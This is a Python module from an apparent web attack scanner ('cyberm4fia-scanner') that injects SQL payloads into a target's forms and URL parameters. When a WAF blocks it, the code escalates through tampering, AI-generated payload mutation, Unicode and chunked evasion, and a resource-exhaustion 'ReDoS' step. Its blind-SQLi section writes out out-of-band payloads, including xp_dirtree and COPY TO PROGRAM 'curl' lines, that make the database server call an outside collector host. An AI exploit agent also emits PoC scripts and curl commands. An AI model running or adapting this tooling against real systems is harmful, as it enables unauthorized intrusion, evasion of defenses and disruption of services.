"""
cyberm4fia-scanner - SQLi Module
SQL Injection detection
"""

import sys
import time
import httpx
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin

from utils.request import (
    get_oob_client,
    get_thread_count,
    increment_vulnerability_count,
    smart_request,
)
from utils.colors import Colors, log_info, log_success, log_vuln, log_warning
from modules.payloads import (
    BLIND_SQLI_PAYLOADS,
    BLIND_SQLI_THRESHOLD,
    SQLI_PAYLOADS,
    SQLI_ERRORS,
)
from utils.payload_filter import PayloadFilter
from modules.smart_payload import probe_sqli_context
from utils.request import ScanExceptions

def detect_sqli(text):
    """Check response for SQL error patterns"""
    text_lower = text.lower()
    for error in SQLI_ERRORS:
        if error.lower() in text_lower:
            return error
    return None

def _check_sqli_error(
    resp, payload, target_name, url_or_action, method, data, smart_payloads, source=None
):
    """Helper to check reflection and log SQLi"""
    error = detect_sqli(resp.text)
    if error:
        increment_vulnerability_count()
        if not source:
            source = "🧠 Smart" if payload in smart_payloads else "📋 Static"
        log_vuln(f"SQLi VULNERABILITY FOUND! [{source}]")
        log_success(f"Target: {target_name} | Error: {error}")
        log_success(f"Payload: {payload}")
        return {
            "type": "SQLi_Form" if data else "SQLi_Param",
            ("field" if data else "param"): target_name,
            "payload": payload,
            "error": error,
            "url": url_or_action,
            "method": method if data else "get",
            "form_data": data if data else {},
            "source": source,
        }
    return None

import functools
from utils.concurrency import run_concurrent_tasks

def _test_sqli_form_payload(payload, inp, inputs, method, target, delay, smart):
    data = inputs.copy()
    data[inp] = payload
    try:
        if method == "post":
            resp = smart_request("post", target, data=data, delay=delay)
        else:
            resp = smart_request("get", target, params=data, delay=delay)

        vuln_found = _check_sqli_error(
            resp, payload, inp, target, method, data, smart
        )
        if vuln_found:
            return vuln_found

        from utils.waf import waf_detector

        if waf_detector.is_waf_block(resp.status_code, resp.text):
            waf_name = waf_detector.detected_waf or "Generic WAF"
            log_warning(f"WAF Block ({waf_name}) detected on form field '{inp}'")

            from utils.tamper import TamperChain
            tampers = waf_detector.get_recommended_tampers()
            if tampers:
                log_info(f"Applying auto-tamper for {waf_name}: {'+'.join(tampers)}")
                chain = TamperChain(tampers)
                tampered_payload = chain.apply(payload)
                if tampered_payload != payload:
                    data[inp] = tampered_payload
                    resp_t = (
                        smart_request("post", target, data=data, delay=delay)
                        if method == "post"
                        else smart_request("get", target, params=data, delay=delay)
                    )
                    vuln_found = _check_sqli_error(
                        resp_t, tampered_payload, inp, target, method, data, smart, source="⚡ Auto-Tamper"
                    )
                    if vuln_found:
                        return vuln_found

                    from utils.ai import get_ai, EvolvingWAFBypassEngine
                    ai_client = get_ai()
                    if ai_client and ai_client.available and waf_detector.is_waf_block(resp_t.status_code, resp_t.text):
                        log_info(f"🤖 Starting Evolutionary AI Mutation for {waf_name}...")
                        engine = EvolvingWAFBypassEngine(ai_client, waf_name, "SQL Injection")
                        current_payload = payload
                        for iteration in range(1, 4):
                            ai_payloads = engine.mutate(current_payload, iteration)
                            for ai_p in ai_payloads:
                                data[inp] = ai_p
                                resp_ai = (
                                    smart_request("post", target, data=data, delay=delay)
                                    if method == "post"
                                    else smart_request("get", target, params=data, delay=delay)
                                )
                                vuln_found = _check_sqli_error(
                                    resp_ai, ai_p, inp, target, method, data, smart, source=f"🤖 AI Gen-{iteration}"
                                )
                                if vuln_found:
                                    return vuln_found
                                if waf_detector.is_waf_block(resp_ai.status_code, resp_ai.text):
                                    engine.analyze_failure(ai_p)
                                    current_payload = ai_p
                            if vuln_found:
                                break
                        if not vuln_found:
                            log_info(f"🛡️ Falling back to Protocol-Level Evasion for {waf_name}...")
                            data[inp] = payload
                            resp_ev1 = (
                                smart_request("post", target, data=data, delay=delay, evasion_level=1)
                                if method == "post"
                                else smart_request("get", target, params=data, delay=delay, evasion_level=1)
                            )
                            vuln_found = _check_sqli_error(resp_ev1, payload, inp, target, method, data, smart, source="🛡️ Unicode Evasion")
                            if vuln_found: return vuln_found

                            if waf_detector.is_waf_block(resp_ev1.status_code, resp_ev1.text):
                                resp_ev2 = (
                                    smart_request("post", target, data=data, delay=delay, evasion_level=2)
                                    if method == "post"
                                    else smart_request("get", target, params=data, delay=delay, evasion_level=2)
                                )
                                vuln_found = _check_sqli_error(resp_ev2, payload, inp, target, method, data, smart, source="🧱 Chunked Evasion")
                                if vuln_found: return vuln_found

                                if waf_detector.is_waf_block(resp_ev2.status_code, resp_ev2.text):
                                    log_warning(f"💥 Bruteforcing {waf_name} via Resource Exhaustion (Level 3)")
                                    resp_ev3 = (
                                        smart_request("post", target, data=data, delay=delay, evasion_level=3)
                                        if method == "post"
                                        else smart_request("get", target, params=data, delay=delay, evasion_level=3)
                                    )
                                    vuln_found = _check_sqli_error(resp_ev3, payload, inp, target, method, data, smart, source="💥 ReDoS Evasion")
                                    if vuln_found: return vuln_found
    except ScanExceptions:
        pass
    return None

def _test_sqli_param_payload(payload, param, params, parsed, delay, smart):
    test_params = params.copy()
    test_params[param] = [payload]
    test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))
    try:
        resp = smart_request("get", test_url, delay=delay)
        vuln_found = _check_sqli_error(resp, payload, param, test_url, "get", None, smart)
        if vuln_found:
            return vuln_found

        from utils.waf import waf_detector
        if waf_detector.is_waf_block(resp.status_code, resp.text):
            waf_name = waf_detector.detected_waf or "Generic WAF"
            log_warning(f"WAF Block ({waf_name}) detected on param '{param}'")

            from utils.tamper import TamperChain
            tampers = waf_detector.get_recommended_tampers()
            if tampers:
                log_info(f"Applying auto-tamper for {waf_name}: {'+'.join(tampers)}")
                chain = TamperChain(tampers)
                tampered_payload = chain.apply(payload)
                if tampered_payload != payload:
                    test_params[param] = [tampered_payload]
                    test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))
                    resp_t = smart_request("get", test_url, delay=delay)
                    vuln_found = _check_sqli_error(resp_t, tampered_payload, param, test_url, "get", None, smart, source="⚡ Auto-Tamper")
                    if vuln_found: return vuln_found

                    from utils.ai import get_ai, EvolvingWAFBypassEngine
                    ai_client = get_ai()
                    if ai_client and ai_client.available and waf_detector.is_waf_block(resp_t.status_code, resp_t.text):
                        log_info(f"🤖 Starting Evolutionary AI Mutation for {waf_name}...")
                        engine = EvolvingWAFBypassEngine(ai_client, waf_name, "SQL Injection")
                        current_payload = payload
                        for iteration in range(1, 4):
                            ai_payloads = engine.mutate(current_payload, iteration)
                            for ai_p in ai_payloads:
                                test_params[param] = [ai_p]
                                test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))
                                resp_ai = smart_request("get", test_url, delay=delay)
                                vuln_found = _check_sqli_error(resp_ai, ai_p, param, test_url, "get", None, smart, source=f"🤖 AI Gen-{iteration}")
                                if vuln_found: return vuln_found
                                if waf_detector.is_waf_block(resp_ai.status_code, resp_ai.text):
                                    engine.analyze_failure(ai_p)
                                    current_payload = ai_p
                            if vuln_found: break
                        if not vuln_found:
                            log_info(f"🛡️ Falling back to Protocol-Level Evasion for {waf_name}...")
                            test_params[param] = [payload]
                            test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))
                            resp_ev1 = smart_request("get", test_url, delay=delay, evasion_level=1)
                            vuln_found = _check_sqli_error(resp_ev1, payload, param, test_url, "get", None, smart, source="🛡️ Unicode Evasion")
                            if vuln_found: return vuln_found

                            if waf_detector.is_waf_block(resp_ev1.status_code, resp_ev1.text):
                                resp_ev2 = smart_request("get", test_url, delay=delay, evasion_level=2)
                                vuln_found = _check_sqli_error(resp_ev2, payload, param, test_url, "get", None, smart, source="🧱 Chunked Evasion")
                                if vuln_found: return vuln_found

                                if waf_detector.is_waf_block(resp_ev2.status_code, resp_ev2.text):
                                    log_warning(f"💥 Bruteforcing {waf_name} via Resource Exhaustion (Level 3)")
                                    resp_ev3 = smart_request("get", test_url, delay=delay, evasion_level=3)
                                    vuln_found = _check_sqli_error(resp_ev3, payload, param, test_url, "get", None, smart, source="💥 ReDoS Evasion")
                                    if vuln_found: return vuln_found
    except ScanExceptions:
        pass
    return None

def scan_sqli(url, forms, delay, options=None, threads=None):
    from utils.tamper import get_tamper_chain
    if threads is None: threads = get_thread_count()
    options = options or {}
    target_context = options.get("target_context")

    chain = get_tamper_chain()
    payloads = list(SQLI_PAYLOADS)
    if chain.active:
        payloads = chain.apply_list(payloads)

    if target_context:
        payloads = PayloadFilter.filter_payloads(payloads, target_context)

    log_info(f"Testing SQLi with {len(payloads)} payloads ({threads} threads)...")
    tasks = []

    flattened_forms = []
    for f in forms:
        if isinstance(f, list): flattened_forms.extend(f)
        else: flattened_forms.append(f)

    for form in flattened_forms:
        if hasattr(form, "find_all"):
            action = form.get("action") or url
            method = form.get("method", "get").lower()
            target = urljoin(url, action)
            inputs = {}
            for i in form.find_all(["input", "textarea", "select"]):
                if i.get("name"): inputs[i.get("name")] = i.get("value", "1")
        else:
            action = form.get("action") or url
            method = form.get("method", "get").lower()
            target = urljoin(url, action)
            inputs = {}
            raw_inputs = form.get("inputs", [])
            for i in raw_inputs:
                if isinstance(i, dict) and i.get("name"):
                    inputs[i.get("name")] = i.get("value", "1")
            if not inputs and raw_inputs and isinstance(raw_inputs[0], str):
                for i in raw_inputs: inputs[i] = "1"

        if not inputs: continue

        for inp in inputs:
            if inp.lower() in ["submit", "btnsubmit", "login"]: continue
            # We don't do smart probing per form here, just run all payloads
            for payload in payloads:
                tasks.append(functools.partial(_test_sqli_form_payload, payload, inp, inputs, method, target, delay, []))

    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    for param in params:
        flat_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
        probe = probe_sqli_context(urlunparse(parsed), param, flat_params, method="get", delay=delay)
        smart = probe.get("smart_payloads", [])
        all_payloads = smart + [p for p in payloads if p not in smart] if smart else payloads
        for payload in all_payloads:
            tasks.append(functools.partial(_test_sqli_param_payload, payload, param, params, parsed, delay, smart))

    vulns = run_concurrent_tasks(tasks, max_workers=threads)

    # Remove duplicates (since multiple threads might find the same vuln)
    unique_vulns = []
    seen = set()
    for v in vulns:
        if not v: continue
        key = f"{v.get('type')}:{v.get('field', v.get('param'))}:{v.get('payload')}"
        if key not in seen:
            seen.add(key)
            unique_vulns.append(v)
    vulns = unique_vulns

    if not vulns and params:
        try:
            from utils.ai_exploit_agent import get_exploit_agent, ExploitContext
            agent = get_exploit_agent()
            if agent and agent.available:
                from utils.waf import waf_detector
                waf_name = getattr(waf_detector, "detected_waf", "") or ""
                for param in params:
                    ctx = ExploitContext(url=url, param=param, vuln_type="SQLi", waf=waf_name, http_method="GET")
                    result = agent.exploit_sqli(ctx)
                    if result and result.success:
                        increment_vulnerability_count()
                        log_info(f"[!!!] SQLi in: {param} [🤖 AI Agent Gen-{result.iteration}]")
                        vulns.append({
                            "type": "SQLi",
                            "param": param,
                            "payload": result.payload,
                            "url": url,
                            "source": f"🤖 AI Agent (confidence: {result.confidence:.0f}%)",
                            "evidence": result.evidence[:200],
                            "ai_curl": result.curl_command,
                            "ai_poc_script": result.python_script,
                            "ai_nuclei": result.nuclei_template,
                        })
                        break
        except ImportError:
            pass

    return vulns

def scan_blind_sqli(url, forms, delay, options=None):
    """Scan for blind SQL injection using time-based detection"""
    options = options or {}
    target_context = options.get("target_context")
    
    payloads = list(BLIND_SQLI_PAYLOADS)
    if target_context:
         payloads = PayloadFilter.filter_payloads(payloads, target_context)
         
    log_info(f"Testing Blind SQLi with {len(payloads)} payloads...")
    vulns = []

    oob_client = get_oob_client()
    oob_payloads = []
    if oob_client and oob_client.ready:
        # MySQL: LOAD_FILE or HEX based OOB
        oob_url = oob_client.generate_payload("SQLi", "form_input")
        # Removing http:// prefix for DNS-based tricks if URL contains the IP
        # For LocalOOBProvider it's http://IP:PORT/token
        oob_payloads.extend([
            f"'; SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT DATABASE()),'.{oob_url.replace('http://', '')}\\\\a'))-- ",
            f"'; EXEC master..xp_dirtree '//{oob_url.replace('http://', '')}/a'-- ",
            f"'; copy (select '') to program 'curl {oob_url}'-- "
        ])

    flattened_forms = []
    for f in forms:
        if isinstance(f, list):
            flattened_forms.extend(f)
        else:
            flattened_forms.append(f)

    # Test forms for Blind SQLi
    for form in flattened_forms:
        if hasattr(form, "find_all"):
            action = form.get("action") or url
            method = form.get("method", "get").lower()
            target = urljoin(url, action)
            # Extract inputs with values
            inputs = {}
            for i in form.find_all(["input", "textarea", "select"]):
                if i.get("name"):
                    inputs[i.get("name")] = i.get("value", "1")
        else:
            action = form.get("action") or url
            method = form.get("method", "get").lower()
            target = urljoin(url, action)
            inputs = {}
            raw_inputs = form.get("inputs", [])
            for i in raw_inputs:
                if isinstance(i, dict) and i.get("name"):
                    inputs[i.get("name")] = i.get("value", "1")
            if not inputs and raw_inputs and isinstance(raw_inputs[0], str):
                for i in raw_inputs:
                    inputs[i] = "1"

        if not inputs:
            continue

        for inp in inputs:
            # Skip Submit buttons
            if inp.lower() in ["submit", "btnsubmit", "login", "security"]:
                continue

            current_payloads = payloads + oob_payloads
            for payload in current_payloads:
                # Use only sleep payloads, time-based ones, or OOB payloads
                if (
                    "SLEEP" in payload.upper()
                    or "pg_sleep" in payload.lower()
                    or "WAITFOR" in payload.upper()
                    or (oob_client and oob_client.ready and any(p in payload for p in ["LOAD_FILE", "xp_dirtree", "curl"]))
                ):
                    # Preserve original values logic
                    data = inputs.copy()
                    data[inp] = payload

                    # Show progress (overwrite line)
                    sys.stdout.write(f"\r[*] Testing {inp}: {payload[:40]:<40}")
                    sys.stdout.flush()

                    try:
                        start = time.time()
                        smart_request(
                            method,
                            target,
                            data=data if method == "post" else None,
                            params=data if method != "post" else None,
                            delay=0,
                        )
                        elapsed = time.time() - start

                        if elapsed > BLIND_SQLI_THRESHOLD:
                            # Baseline check
                            base_data = inputs.copy()
                            base_data[inp] = "cybm4f1a_sqli_baseline"
                            start_base = time.time()
                            smart_request(
                                method,
                                target,
                                data=base_data if method == "post" else None,
                                params=base_data if method != "post" else None,
                                delay=0,
                            )
                            base_elapsed = time.time() - start_base

                            if base_elapsed < 2.0:
                                # Clear progress line
                                sys.stdout.write("\r" + " " * 60 + "\r")
                                sys.stdout.flush()

                                increment_vulnerability_count()

                                log_vuln("BLIND SQLi VULNERABILITY FOUND!")
                                log_success(
                                    f"Target slept for {elapsed:.2f}s! (Baseline: {base_elapsed:.2f}s, Threshold: {BLIND_SQLI_THRESHOLD}s)"
                                )
                                print(
                                    f"    {Colors.GREEN}└──> Payload confirmed: {payload}{Colors.END}"
                                )

                                vulns.append(
                                    {
                                        "type": "Blind_SQLi_Form",
                                        "field": inp,
                                        "payload": payload,
                                        "response_time": elapsed,
                                        "url": target,
                                        "method": method,
                                    }
                                )
                                break
                            else:
                                sys.stdout.write("\r" + " " * 60 + "\r")
                                sys.stdout.flush()
                                log_info(
                                    f"Ignored SQLi false positive on {inp} (Network delay: {base_elapsed:.2f}s)"
                                )
                            break  # Found one payload that works, move to next input
                    except httpx.RequestError:
                        pass  # Individual blind form payload failure

    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    for param in params:
        current_payloads = BLIND_SQLI_PAYLOADS + oob_payloads
        for payload in current_payloads:
            if "SLEEP" in payload.upper() or "pg_sleep" in payload.lower() or (oob_client and oob_client.ready and any(p in payload for p in ["LOAD_FILE", "xp_dirtree", "curl"])):
                test_params = params.copy()
                test_params[param] = [payload]
                test_url = urlunparse(
                    parsed._replace(query=urlencode(test_params, doseq=True))
                )

                try:
                    start = time.time()
                    smart_request("get", test_url, delay=0)  # No extra delay for timing
                    elapsed = time.time() - start

                    if elapsed > BLIND_SQLI_THRESHOLD:
                        # Baseline check
                        base_params = params.copy()
                        base_params[param] = ["cybm4f1a_sqli_baseline"]
                        base_url = urlunparse(
                            parsed._replace(query=urlencode(base_params, doseq=True))
                        )
                        start_base = time.time()
                        smart_request("get", base_url, delay=0)
                        base_elapsed = time.time() - start_base

                        if base_elapsed < 2.0:
                            increment_vulnerability_count()

                            log_vuln("BLIND SQLi VULNERABILITY FOUND!")
                            log_success(
                                f"Param: {param} | Delay: {elapsed:.2f}s (Baseline: {base_elapsed:.2f}s)"
                            )
                            log_success(f"Payload: {payload}")

                            vulns.append(
                                {
                                    "type": "Blind_SQLi_Param",
                                    "param": param,
                                    "payload": payload,
                                    "response_time": elapsed,
                                    "url": test_url,
                                }
                            )
                            break
                        else:
                            log_info(
                                f"Ignored SQLi false positive on {param} (Network delay: {base_elapsed:.2f}s)"
                            )
                            break
                except ScanExceptions:
                    pass  # Individual blind param payload failure

    return vulns
